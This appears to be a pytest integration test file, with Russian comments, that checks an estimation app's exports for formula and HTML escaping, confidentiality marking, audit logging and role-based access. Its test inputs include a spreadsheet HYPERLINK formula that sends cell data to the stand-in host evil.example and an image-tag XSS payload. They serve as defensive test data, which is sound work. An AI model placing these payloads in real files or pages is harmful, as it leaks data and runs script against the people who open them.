"""QA-006 · TC-SEC-04, TC-SEC-05, TC-SEC-09: безопасность выгрузок на проекте «со всем».

Узлы с враждебными названиями (формула ``=HYPERLINK(…)`` и все префиксы формул, HTML со скриптом)
проходят через каждый вид выгрузки проекта; в каждом файле:

* ни одной формулы, строка с префиксом формулы начинается с апострофа (TC-SEC-05);
* HTML выводится текстом как есть (CL-06, SEC-WEB-06);
* гриф «Коммерческая тайна», ФИО выгрузившего и дата (TC-SEC-09);
* запись ``export.created`` в аудите.

Эксперту: «Часы» без денег ни в одной ячейке, «С деньгами» и Word «Допущения и риски» — 403
(TC-SEC-04). CSV журнала аудита с грифом — tests/integration/auth/test_audit_view.py.
"""

from __future__ import annotations

import datetime as dt
import io
import re
import zipfile
from collections.abc import Iterator
from typing import Any

import pytest
from docx import Document
from openpyxl import load_workbook
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncSession
from tests.integration.core.conftest import Actor, World, deliver_events
from tests.integration.core.test_nodes_api import _create, _patch
from tests.security.stocked import Stocked, stocked

from estimator.db.models.users import User
from estimator.exports import engine
from estimator.exports.safe_values import FORMULA_PREFIXES

pytestmark = [pytest.mark.integration, pytest.mark.tc("TC-SEC-04"), pytest.mark.tc("TC-SEC-05"),
              pytest.mark.tc("TC-SEC-09"), pytest.mark.spec("FR-EXP-04"),
              pytest.mark.spec("FR-EXP-06"), pytest.mark.spec("SEC-WEB-06")]  # fmt: skip

HYPERLINK = '=HYPERLINK("http://evil.example/?d="&A1;"Нажмите")'
XSS = "<img src=x onerror=alert(1)>"
MARK = "Коммерческая тайна"
#: Выгрузки, поставленные в тесте (для сверки с аудитом).
MADE: list[str] = []
#: Денежные слова в ячейках «Часов» (заголовки и суммы в валюте).
MONEY_TEXT = re.compile(r"Ставк|Стоимост|₽|\bUSD\b|\bEUR\b|Курс|НДС")


async def _hostile(st: Stocked, db: AsyncSession) -> None:
    """Листья с формулами всех префиксов и с HTML в названии и комментарии."""
    branch = await st.s.branch(db, st.s.backend)
    titles = [HYPERLINK, XSS] + [f"{p}1+1 узел" for p in FORMULA_PREFIXES if p != "="]
    for title in titles:
        made = await _create(st.s.backend_expert, st.s.pid, branch.id, title=title, o="1", r="2",
                             p="3")  # fmt: skip
        assert made.status_code == 201, (title, made.text)
        node = made.json()["node"]
        noted = await _patch(st.s.backend_expert, node["id"], node["version"],
                             comment_lines=[{"tag_id": None, "text": XSS}])  # fmt: skip
        assert noted.status_code == 200, noted.text
    # вопрос заказчику с HTML — для Word-выгрузки вопросов
    customer = [{"target_type": "customer", "target_id": None}]
    cq = await st.s.backend_expert.post(
        f"/nodes/{node['id']}/messages", json={"body": f"{HYPERLINK} {XSS}", "addressees": customer}
    )
    assert cq.status_code == 201, cq.text
    st.ids["cq_thread"] = cq.json()["thread_id"]


async def _file(db: AsyncSession, queue: list[Any], actor: Actor, made: Any) -> tuple[str, bytes]:
    assert made.status_code == 202, made.text
    export_id = made.json()["id"]
    MADE.append(export_id)
    await deliver_events(db)
    [job] = [j for j in queue if str(j.export_id) == export_id]
    await engine.run(db, job)
    ready = (await actor.get(f"/exports/{export_id}")).json()
    assert ready["status"] == "ready", ready
    got = await actor.get(ready["download_url"].removeprefix("/api/v1"))
    assert got.status_code == 200, got.text
    assert got.headers["content-disposition"].startswith("attachment;")
    assert got.headers["x-content-type-options"] == "nosniff"
    return ready["file_name"], got.content


def _texts(name: str, data: bytes) -> Iterator[str]:
    if name.endswith(".xlsx"):
        for sheet in load_workbook(io.BytesIO(data)).worksheets:
            for row in sheet.iter_rows():
                for cell in row:
                    if isinstance(cell.value, str):
                        yield cell.value
    else:
        doc = Document(io.BytesIO(data))
        yield from (p.text for p in doc.paragraphs)
        for table in doc.tables:
            for row in table.rows:
                yield from (c.text for c in row.cells)


def _check_file(name: str, data: bytes, who: str, today: str) -> list[str]:
    problems: list[str] = []
    if name.endswith(".xlsx"):
        with zipfile.ZipFile(io.BytesIO(data)) as archive:
            for part in archive.namelist():
                if part.startswith("xl/worksheets/") and "<f>" in archive.read(part).decode():
                    problems.append(f"{name}: формула в {part}")
        book = load_workbook(io.BytesIO(data))
        if book.worksheets[0]["A1"].value != MARK:
            problems.append(f"{name}: нет грифа в A1 первого листа")
        for sheet in book.worksheets:  # колонтитулы — на каждом листе (печать)
            header = sheet.oddHeader.center.text or ""
            if not (MARK in header and today in header):
                problems.append(f"{name}: нет грифа и даты в колонтитуле листа «{sheet.title}»")
    texts = list(_texts(name, data))
    joined = "\n".join(texts)
    # формулы опасны в таблицах (xlsx, CSV); в Word текст не вычисляется (FR-EXP-04)
    for value in texts if name.endswith(".xlsx") else []:
        for line in value.splitlines():
            formula = line[:1] in FORMULA_PREFIXES and "1+1 узел" in line
            if formula or line.startswith("=HYPERLINK"):
                problems.append(f"{name}: не экранировано {line!r}")
    if XSS.replace("<", "") in joined.replace("<", "") and XSS not in joined:
        problems.append(f"{name}: HTML изменён")
    if MARK not in joined:
        problems.append(f"{name}: нет грифа")
    if who not in joined:
        problems.append(f"{name}: нет ФИО выгрузившего {who}")
    if today not in joined:
        problems.append(f"{name}: нет даты {today}")
    return problems


async def _all_exports(
    db: AsyncSession, queue: list[Any], st: Stocked, actor: Actor
) -> dict[str, tuple[str, bytes]]:
    pid = st.s.pid
    out = {
        "hours": await _file(db, queue, actor, await _kind(actor, pid, "hours_xlsx")),
        "money": await _file(db, queue, actor, await _kind(actor, pid, "money_xlsx")),
        "diff": await _file(db, queue, actor, await actor.post(
            f"/snapshots/{st.ids['snapshot']}/diff/export", json={"with": "current"})),
        "assumptions": await _file(db, queue, actor,
                                   await actor.get(f"/projects/{pid}/assumptions/export")),
    }  # fmt: skip
    for tab in ("readiness", "totals", "discussions", "customer_questions"):
        out[f"stats:{tab}"] = await _file(db, queue, actor, await actor.get(
            f"/projects/{pid}/stats/{tab}/export", params={"format": "xlsx"}))  # fmt: skip
    for fmt in ("xlsx", "docx"):
        out[f"cq:{fmt}"] = await _file(db, queue, actor, await actor.post(
            f"/projects/{pid}/customer-questions/export",
            json={"thread_ids": [str(st.ids["cq_thread"])], "format": fmt}))  # fmt: skip
    return out


def _today() -> str:
    moscow = dt.timezone(dt.timedelta(hours=3))  # часовой пояс пользователя по умолчанию
    return dt.datetime.now(dt.UTC).astimezone(moscow).strftime("%d.%m.%Y")


async def _kind(actor: Actor, pid: Any, kind: str) -> Any:
    return await actor.post(f"/projects/{pid}/exports", json={"kind": kind})


async def _full_name(db: AsyncSession, actor: Actor) -> str:
    user = await db.get(User, actor.id)
    assert user is not None
    return user.full_name


async def test_every_export_is_escaped_marked_and_audited(
    world: World, db_session: AsyncSession, export_queue: list[Any]
) -> None:
    MADE.clear()
    st = await stocked(world, db_session)
    await _hostile(st, db_session)
    moderator = st.s.moderator
    files = await _all_exports(db_session, export_queue, st, moderator)
    who, today = await _full_name(db_session, moderator), _today()
    problems = [p for name, data in files.values() for p in _check_file(name, data, who, today)]
    assert problems == [], "\n".join(problems)
    # враждебные названия дошли до файла — иначе проверка экранирования пустая
    hours = "\n".join(_texts(*files["hours"]))
    assert "'" + HYPERLINK in hours
    assert XSS in hours
    for kind in ("cq:xlsx", "cq:docx"):
        assert XSS in "\n".join(_texts(*files[kind])), kind

    audited = set((await db_session.scalars(text(
        "SELECT object_id::text FROM audit.audit_log WHERE event_type = 'export.created'"
    ))).all())  # fmt: skip
    assert set(MADE) <= audited, set(MADE) - audited


async def test_expert_hours_without_money(
    world: World, db_session: AsyncSession, export_queue: list[Any]
) -> None:
    st = await stocked(world, db_session)
    expert, pid = st.s.backend_expert, st.s.pid
    hours = await _kind(expert, pid, "hours_xlsx")
    name, data = await _file(db_session, export_queue, expert, hours)
    money = [t for t in _texts(name, data) if MONEY_TEXT.search(t)]
    assert money == []
    stats_name, stats = await _file(db_session, export_queue, expert, await expert.get(
        f"/projects/{pid}/stats/totals/export", params={"format": "xlsx"}))  # fmt: skip
    assert [t for t in _texts(stats_name, stats) if MONEY_TEXT.search(t)] == []
    for denied in (
        await expert.post(f"/projects/{pid}/exports", json={"kind": "money_xlsx"}),
        await expert.get(f"/projects/{pid}/assumptions/export"),
    ):
        assert (denied.status_code, denied.json()["code"]) == (403, "FORBIDDEN"), denied.text
